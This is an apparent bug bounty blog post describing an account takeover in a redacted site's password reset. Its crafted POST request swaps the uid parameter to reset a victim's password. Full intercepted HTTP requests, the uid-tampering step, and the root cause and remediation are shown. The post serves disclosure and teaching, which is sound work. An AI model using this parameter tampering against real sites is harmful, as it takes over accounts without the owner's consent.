---
title: "Account Takeover Via Password Change Functionality"
categories:
- Misc
image:
  path: preview.png
layout: post
media_subpath: /assets/posts/2026-07-24-account-takeover-via-password-change-functionality
tags:
- account takeover
- account takeover attack
- password change functionality
- web vulnerability
- ethical hacking
- bug bounty
- application security
- ATO
---

## What is Account Takeover vulnerability? 

Account Takeover vulnerability occurs when an attacker successfully gain the access of victim’s account. It can be done by various methods.

1- By exploiting application functionality

  - Forgot Password Functionality
  - Password Change Functionality

2- By stealing username and password

Vulnerability which I found in this application, that allows an attacker to change victim’s account password, gain an unauthorized access and full control of the victim’s account via exploiting the password change functionality in the application.

## Impact

Account takeover attacks allow an attacker to breach and exfiltration of vast amounts of sensitive information, confidential, alter the existing information, take complete ownership of the account or some time delete the account.

## Steps To Exploit

How I able to take full control of the victim’s account via exploiting the “Password Change Functionality”. 

## Attack Scenario

During the bug bounty, I came across an application in which password functionality is not implemented properly. While signing-up, application assign a unique user ID called uid. To Check this I created multiple account and found that user ID is in increasing order.

  - secsecur3@gmail.com       - user id = 919
  - sectest24@gmail.com        - user id = 918
  - trebioro@fakeinbox.com   - user Id = 921
  - laclesea@fakeinbox.com   - user id = 922
  - liotewra@fakeinbox.com   - user id = 923

Now, I send a password reset link to secsecur3@gmail.com (Attacker's email ID). 

Reset Password Link : 

```
https://xxxxxxxxxx.co/login/password-reset/919/cd12ab0b-8c1b-4afd-a76f-43c69b48bd1d

```   

Analyzing the password reset link, observed that user ID is mentioned in the URL. Access to above URL, landing to new password and confirm password page. After filling both field, intercept the request using burpsuite and submit.

In the web proxy, change the value of parameter “uid” from 919 to any victim’s user ID. In our case 918 and forward the request. Request is successfully submitted and and victim’s password is successfully change. Below are the requests.

Original Request for email Id secsecur3@gmail.com (Attacker's email ID).

```
POST /login/password-reset.php HTTP/1.1
Host:   xxxxxxx.co
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://xxxxxxxxxx.co/login/password-reset/919/cd12ab0b-8c1b-4afd-a76f-43c69b48bd1d
Cookie: __cfduid=d3335af0ffe809be130be237e3bd095231419880061; _ga=GA1.2.1784027573.1419880085; __uvt=; uvts=2VdBgTTCcQzULfF8; PHPSESSID=5eh5969btd90ee7jo5f12ee6i7
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 192

password1=test@123&password2=test@123&csrf=yk+pkQZwwDXoeTFS5mlGA/Ygbd+yX3jMESLjQwS/+L6HF2gC7YJexTzh/SENodjI&uid=919&reset_code=cd12ab0b-8c1b-4afd-a76f-43c69b48bd1d&submit=reset 

```
Crafted Request for email Id sectest24@gmail.com (Victim's email ID).

```
POST /login/password-reset.php HTTP/1.1
Host:   xxxxxxxxx.co
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://xxxxxxxxx.co/login/password-reset/919/cd12ab0b-8c1b-4afd-a76f-43c69b48bd1d
Cookie: __cfduid=d3335af0ffe809be130be237e3bd095231419880061; _ga=GA1.2.1784027573.1419880085; __uvt=; uvts=2VdBgTTCcQzULfF8; PHPSESSID=5eh5969btd90ee7jo5f12ee6i7
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 192

password1=test@123&password2=test@123&csrf=yk+pkQZwwDXoeTFS5mlGA/Ygbd+yX3jMESLjQwS/+L6HF2gC7YJexTzh/SENodjI&uid=918&reset_code=cd12ab0b-8c1b-4afd-a76f-43c69b48bd1d&submit=reset
```

This is how I successfully change the victim user password and take full control of his account.

## Root Cause 

Post parameter uid is not validating on server side or reset_code does not checking the uid parameter.

## Remediation 

1- uid parameter value should be random.
2- uid should be validate on server side.
3- reset_code should map the uid and check valid uid
